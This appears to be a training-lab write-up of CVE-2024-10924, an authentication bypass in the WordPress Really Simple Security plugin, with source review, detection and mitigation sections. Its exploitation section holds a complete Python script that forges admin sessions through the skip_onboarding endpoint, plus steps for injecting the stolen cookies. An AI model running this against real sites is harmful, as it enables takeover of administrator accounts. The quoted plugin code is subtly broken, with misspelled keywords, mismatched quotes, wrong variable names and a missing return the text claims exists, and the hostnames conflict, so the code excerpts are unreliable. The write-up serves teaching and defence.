# Bypassing really simple security plugin

Wordpress is one of the most popular open-source Content Mangement Systems(CMS) and it is widely used to build websites ranging from blogs to e-commerce platforms. In November 2024, a critical vulnerability was discovered in the [Really Simple Security Plugin](https://really-simple-ssl.com), a widely adopted security plugin used by millions of websites. The vulnerability allowed attackers to bypass authentication and gain unauthorised access to user accounts, including those with administrative privileges. Since WordPress is a CMS, gaining administrtative access sometimes allows you even to perform privilege escalation and get complete control of the server/network.

## How it works

The vulnerability in CVE-2024-10924 arises due to non-adherence to secure coding practices while handling REST API endpoints in the WordPress Really Simple Security plugin. This plugin is widely used to add additional security measures, including Two-Factor Authentication (2FA). Unfortunately, improper validation during the authentication process allows attackers to exploit API endpoints and bypass critical checks.

WordPress offers various entry points for interaction:

- Admin Dashboard: Used for administrative management via the **/wp-adim** endpoint. Only authenticated users with valid credentials can access this interface.
- Public Interface: Manged by the index.php file in the root directory, it serves content to visitors.
- REST API: The API provides a flexible entry point for developers to manage site data programmatically. It requires proper authentication to access sensitive resources.

The vulnerability targets REST API endpoints configured for the plugin's Two-Factor Authentication (2FA) mechanism. It enables attackers to bypass authentication by manipulating parameters used during API interactions. The vulnerability occurered due to insufficient validation of user-supplied values, specifically in the skip_onboarding feature.

### How the Vulnerability Works

To understand how the vulnerability works, let's have a source code review to understand the control flow through the different pages. You can review the source code in the **/var/www/html/wp-content/plugins/really-simple-ssl/security/wordpress/two-fa** folder in the attached VM. The plugin contains a PHP class called Rssl_Two_Factor_On_Board_Api, which includes the following essential methods that lead to a bypassing authentication vulnerability:

```bash
                                                     ----> user_id     ---
Skip_onboarding()----> check_login_and_get_user()   |                     |--> authenticate_and_redirect()
                                                     ----> login_nonce ---
```

- skip_onboarding: Skips or manages the 2FA onboarding process for a user by validating their credentials and redirecting them after authentication. It begins by extracting parameters from teh request, including user_id, login_nonce, and redirect_to. These parameters are then passed to the check_login_and_get_user function for validation. If a valid user object is returned, the method calls authenticate_and_redirect, redirecting the user to the redirect_to URL.

```php
public funciont skip_onboarding(WP_REST_Request $request): WP_REST_Response {
    $parameters = new Rssl_Request_Parameters($request);
    //As a double we check the user_id with the login nonce.
    $user = $this->check_login_and_get_user((int)$parameters->user_id, $parameters->login_nonce);
    return $this->authenticate_and_redirect($parameters->user_id, $parameters->redirect_to);
}
```

The vulnerability lies in the skip_onboarding method not validating the return value of check_login_and_get_user. Even if the function returns null, indicating invalid credentials, the process redirects the user, granting unauthorised access. The call to skip_onboarding is carried out through REST API endpoint **/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding** with POST parameters user_id, login_nonce and redirect_to URL.

- check_login_and_get_user: the check_login_and_get_user function is responsible for validating the user_id and login_nonce. It first checks the validity of the login_nonce using the verify_login_nonce function. If the nonce is invalid, it returns null, ensuring an authentication failure. If the nonce is valid, it retrieves the user object associated with the provided user_id and returns it.

```php
private function check_login_and_get_user(int $user_id, string $login_nonce) {
    if (!Rsssl_Two_Fa_Authentication::verify_login_nonce($user_id, $login_nonce)) {
        return new WP_REST_Response(array('error'=>"Invalid login nonce'), 403);
    }
}
```

The problem arises because skip_onboarding does not properly handle the null response from this function. While the function does its job of identifying invalid credentials, the calling method ignores its return value, allowing the process to continue as if the authenticaiton was successful.

- authenticate_and_redirect: This function redirects the user after successful authenticaion. It assumes that the earlier methods have already authenticated the user. It uses the user_id and redirect_to parameters to redirect the user to the desired URL.

```php
private function authenticate_and_redirect(int $use_id, string $redirect_to = ''): WP_REST_Response {
    //Okay checked the provider now authenticate the user.
    wp_set_auth_cookie($user_id, true);
    //Finally redirect the user to the redirect_to or to the home page if teh redirect_to is not set.
    $redirect_to=$redirect_to ?: home_url();
    return new WP_REST_Response(array('redirect_to' => $redirect_to), 200);
}
```

However, this function is called even if authentication fails. Therefore, the attacker is seamlessly redirected to the desired page, bypassing the authentication mechanism. Such instances are the first of their kind, and normally, such security flaws have never been seen in a renowned plugin.

It is important to note that the vulnerability only works for the accounts agains whom 2FA is enabled. The chain of methods reveals how improper validation leads to a critical security flaw:

- In skip_onboarding: The reutrn value from **check_login_and_get_user** is not validated, allowing a null response to be treated as valid user.
- In check_login_and_get_user While it correctly identifies invalid credentials, it relies on the caller to handle its return value, which does not happen.
- In authenticate_and_redirect: it blindly redirects users based on the parameters passed to it, assuming they have been properly authenticated.
- In authenticate_and_redirect: it blindly redirects users based on the parameters passed to it, assuming they have been properly authenticated.

## Exploitation

We will see that the website is protected through a login panel. Our goal is to retrieve credentials against a WordPress user admin with user_id 1.

Below is a simple python script that sends a POST request to the vulnerable endpoint. This script extracts and displays the cookies in response to authenticate the user.

```python
import requests
import urllib.parse
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <user_id>")
    sys.exit(1)

user_id = sys.argv[1]

url = "http://vulwp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),
    "login_nonce": "invalid_nonce",
    "redirect_to": "/wp-admin/"
}

response = requests.post(url, json=data)

if response.status_code == 200:
    print ("Request successful!\n")

    cookies = response.cookies.get_dict()
    count = 1

    for name, value in cookies.items():
        decoded_value = urllib.parse.unquote(value)
        print (f"Cookie {count}:")
        print (f"Cookie Name: {name}")
        print (f"Cookie Value: {decoded_value}\n")
        count += 1
else:
    print ("Request failed!")
    print (f"Status Code: {response.status_code}")
    print (f"Response Text: {response.text}")
```

The above script sends a POST request to the WordPress endpoint and retrieves the authenticated cookie values for the specified **user_id**, with 1 typically being assigned to the first user on the website.

### From Cookies to Admin Login

Now, we will use the cookies retrieved earlier to log in as admin on the WordPress site. While on the **vulnwp.thm:8080** page, you can manually inject the cookies into Firefox. To do this, right-click on the page and select Inspect, then open the browser's developer tools.

Edit the Cookies value and login in as adminstrator to the wordpress site.

## Detection and Mitigation

We learned that the vulnerability in CVE-2024-10924 can be exploited by making a simple API call to a specific endpoint. Now, we will discuss a few detection and mitigation techniques. The challenge lies in detecting such exploitation, as legitimate API calls to the endpoint can also occur, making distinguishing between normal and amlicious activity difficult.

### Examining Logs

To identify exploitation attempts of CVE-2024-10924, we can rely on various logs that capture API activity, events, etc.

Below are some methods to examine logs for potential exploitation:

- **Check WEblogs for API Calls:** Focus on detecting requests to the vulnerable endpoint, **/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding** with unusual patterns like repeated POST request to the endpoint, requests with varying user_id or login_nonce parameters, indicating brute force attemps, etc.
- **Analyse Authentication Logs:** Look for login attempts where two-factor authentication is bypassed. Indicators of potential exploitation include failed login attempts followed by a sudden successful login without 2FA validation, logins to administrative accounts from unexpected geolocations or devices, etc.
- **SIEM Query:** If you are using a **SIEM solution** like OpenSearch, create a query to filter and visualise logs for potential exploitation attempts. A sample query could be:

```bash
method:POST AND path:"/reallysimplessl/v1/two_fa/skip_onboarding"
```

### Mitigation Steps

As part of teh mitigation process, the developers of Really Simple Security plugin have officially released a patch addressing CVE-2024-10924. A source code review of the updated version reveals that additional validation and error handling steps have been implemented to handle the authentication bypass.

Here are some additional mitigation measures to secure your website:

- Apply the official patch: update the Really Simple Security plugin to 9.1.2 or later, which includes a fix for the vulnerability and also enables auto updates.
- Update the alters in the SIEM so you are notified as soon as an exploitation attempt is made.
- Developers must implement proper input validation and rigorous error handling for all API endpoints to prevent the processing of malicious or invalid parameters.
